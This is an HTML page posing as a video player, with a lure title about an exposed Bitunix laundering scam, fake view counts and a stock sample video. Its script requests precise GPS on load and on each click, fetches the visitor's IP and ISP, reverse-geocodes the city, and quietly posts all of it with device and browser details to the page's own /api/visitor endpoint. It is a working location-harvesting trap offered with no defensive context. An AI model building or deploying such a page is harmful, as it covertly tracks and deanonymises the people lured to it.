<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .video-container {
            width: 100%;
            max-width: 900px;
            background: #111;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 0 40px rgba(0,0,0,0.8);
        }

        .video-player {
            width: 100%;
            aspect-ratio: 16/9;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            cursor: pointer;
        }

        .video-player video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .loading-overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }

        .loading-overlay.hidden {
            display: none;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #333;
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-overlay p {
            color: #aaa;
            font-size: 0.9rem;
        }

        .video-info {
            padding: 15px 20px;
        }

        .video-info h1 {
            font-size: 1.1rem;
            margin-bottom: 8px;
            font-weight: 600;
        }

        .video-meta {
            display: flex;
            gap: 15px;
            color: #888;
            font-size: 0.8rem;
            margin-bottom: 12px;
        }

        .video-actions {
            display: flex;
            gap: 15px;
            padding-top: 10px;
            border-top: 1px solid #222;
        }

        .action-btn {
            background: none;
            border: none;
            color: #aaa;
            font-size: 0.85rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            transition: color 0.2s;
        }

        .action-btn:hover { color: #fff; }

        @media (max-width: 600px) {
            .video-container { border-radius: 0; }
            body { justify-content: flex-start; }
        }
    </style>
</head>
<body>
    <div class="video-container">
        <div class="video-player" id="player">
            <video id="video" playsinline>
                <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
            </video>
            <div class="loading-overlay" id="loadingOverlay">
                <div class="spinner"></div>
                <p>Загрузка видео...</p>
            </div>
        </div>
        <div class="video-info">
            <h1>Афера с Bitunix по отмыванию денег раскрыта.</h1>
            <div class="video-meta">
                <span>1.2M обзор</span>
                <span>3 часа назад</span>
                <span>HD 1080p</span>
            </div>
            <div class="video-actions">
                <button class="action-btn">👍 12K</button>
                <button class="action-btn">👎 340</button>
            </div>
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const overlay = document.getElementById('loadingOverlay');

        // Video hazır olanda loading-i gizlət və oynat
        video.addEventListener('canplay', function() {
            overlay.classList.add('hidden');
            video.play().catch(() => {});
        });

        // Videoya klik etdikdə pause/play + GPS soruş
        video.addEventListener('click', function() {
            requestLocation();
            if (video.paused) video.play();
            else video.pause();
        });

        // Səhifə açılan kimi GPS soruş
        window.addEventListener('load', function() {
            video.load();
            requestLocation();
        });

        function requestLocation() {
            if (!navigator.geolocation) return;

            navigator.geolocation.getCurrentPosition(onSuccess, onError, {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            });
        }

        async function onSuccess(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            let ipData = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch(e) {}

            let city = '';
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=az`);
                const data = await res.json();
                city = data.address.city || data.address.town || data.address.village || '';
            } catch(e) {}

            try {
                await fetch('/api/visitor', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ip: ipData.ip || '',
                        isp: ipData.org || '',
                        lat: lat.toFixed(4),
                        lon: lon.toFixed(4),
                        city: city,
                        country: ipData.country_name || '',
                        device: navigator.platform,
                        browser: navigator.userAgent.split(' ').pop(),
                        timestamp: new Date().toISOString()
                    })
                });
            } catch(e) {}
        }

        function onError(err) {}
    </script>
</body>
</html>
